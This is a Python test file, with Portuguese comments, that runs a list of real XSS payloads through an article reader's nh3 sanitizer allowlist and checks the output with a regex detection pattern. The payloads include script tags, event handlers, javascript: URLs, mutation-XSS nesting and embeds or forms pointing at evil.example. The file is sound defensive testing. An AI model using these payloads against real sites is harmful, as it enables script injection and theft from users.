"""XSS pelo leitor de artigos: o HTML de páginas de terceiros chega ao navegador por `dangerouslySetInnerHTML`.

É o único ponto do app que injeta markup (ver ArticleReader.tsx), e a página vem de qualquer site — ou de um
resultado que um modelo de IA indicou. A única barreira é o `nh3.clean` de `services/reader.py`, com a lista de
permissão dele. Este teste passa vetores de XSS reais por essa MESMA configuração: se alguém ampliar `_TAGS` ou
`_ATRIBUTOS` e reabrir a porta, o teste diz qual vetor passou.

O pentest white box (`python -m pentest branca`) marca esse ponto do frontend como revisado por causa deste arquivo.
"""

import re

import nh3
import pytest

from app.services import reader


def _limpar(html: str) -> str:
    return nh3.clean(html, tags=reader._TAGS, attributes=reader._ATRIBUTOS)


_VETORES = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<a href=\"javascript:alert(1)\">clique</a>",
    "<a href=\"  JaVaScRiPt:alert(1)\">clique</a>",
    "<a href=\"java\tscript:alert(1)\">clique</a>",
    "<a href=\"data:text/html,<script>alert(1)</script>\">clique</a>",
    "<a href=\"vbscript:msgbox(1)\">clique</a>",
    "<iframe src=\"https://evil.example\"></iframe>",
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
    "<object data=\"https://evil.example/x.swf\"></object>",
    "<embed src=\"https://evil.example/x.swf\">",
    "<form action=\"https://evil.example\"><input name=senha></form>",
    "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">",
    "<base href=\"https://evil.example/\">",
    "<link rel=stylesheet href=\"https://evil.example/x.css\">",
    "<style>body{background:url(javascript:alert(1))}</style>",
    "<p style=\"background:url(javascript:alert(1))\">x</p>",
    "<p onclick=\"alert(1)\">x</p>",
    "<img src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\">",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    "<details open ontoggle=alert(1)>x</details>",
    "<button formaction=\"javascript:alert(1)\">x</button>",
    "<body onload=alert(1)>",
    "<img src=x onerror=alert&#40;1&#41;>",
    "<<script>alert(1)//<</script>",
]

# Qualquer um destes, em qualquer posição, torna o HTML executável ou o desvia do site.
_PERIGOSO = re.compile(
    r"<\s*(script|iframe|object|embed|form|meta|base|link|style|svg|math)\b|\son\w+\s*=|javascript\s*:|vbscript\s*:|data\s*:|srcdoc|formaction",
    re.IGNORECASE,
)


@pytest.mark.parametrize("vetor", _VETORES)
def test_vetor_de_xss_nao_sobrevive_ao_sanitizador_do_leitor(vetor):
    saida = _limpar(vetor)
    assert not _PERIGOSO.search(saida), f"{vetor!r} virou {saida!r}"


def test_texto_e_estrutura_do_artigo_sobrevivem():
    """Sanitizar demais também é defeito: o artigo precisa continuar legível."""
    html = "<h2>Título</h2><p>Um <strong>parágrafo</strong> com <a href=\"https://exemplo.com/a\">link</a>.</p><pre><code>x = 1</code></pre>"
    saida = _limpar(html)
    for esperado in ("<h2>", "<strong>", "<pre>", "<code>", "x = 1", "https://exemplo.com/a"):
        assert esperado in saida, esperado


def test_o_leitor_nao_permite_no_html_o_que_o_pentest_marca_como_perigoso():
    """Se alguém acrescentar uma tag perigosa à lista de permissão, este teste avisa antes de qualquer vetor."""
    assert not {"script", "iframe", "object", "embed", "form", "style", "meta", "base", "link", "svg", "math"} & set(reader._TAGS)
    permitidos = {a.lower() for atributos in reader._ATRIBUTOS.values() for a in atributos}
    assert not {a for a in permitidos if a.startswith("on")}
    assert not permitidos & {"style", "srcdoc", "formaction", "action"}
